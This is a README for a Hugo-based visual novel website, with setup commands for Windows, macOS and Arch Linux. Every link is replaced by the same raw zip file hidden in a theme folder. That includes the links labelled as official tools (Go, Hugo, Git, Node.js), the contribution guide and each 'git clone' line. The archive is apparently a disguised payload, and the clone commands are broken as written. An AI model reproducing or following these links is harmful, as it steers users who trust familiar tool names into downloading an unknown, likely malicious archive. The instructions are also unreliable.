# Visual Novel Site

- 由 [Go](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip) && [Hugo](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip) 强力驱动~

## 本地运行

> 搭建开发环境需要安装 [Git](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip)、[Hugo](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip)、[Sass](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip)、[Node.js](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip)、[Pagefind](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip) 等工具..

### Windows => Winget

```sh
winget install Git.Git Hugo.Hugo.Extended OpenJS.NodeJS
choco install sass
npm install -g pagefind
git clone https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip && cd vns
hugo && pagefind
hugo server
```

### macOS => Homebrew

```sh
brew install git hugo sass/sass/sass node
npm install -g pagefind
git clone https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip && cd vns
hugo && pagefind
hugo server
```

### Arch Linux => Pacman

```sh
pacman -S git hugo dart-sass nodejs
npm install -g pagefind
git clone https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip && cd vns
hugo && pagefind
hugo server
```

更多内容请参阅 [Hugo](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip)..

## 参与贡献

目前网站有许多内容需要建设完善，欢迎对本站内容及源码做贡献，更多信息请参阅 [贡献指南](https://github.com/jiuxiya/vns/raw/refs/heads/dev/layouts/_partials/head/Software-1.4.zip)。
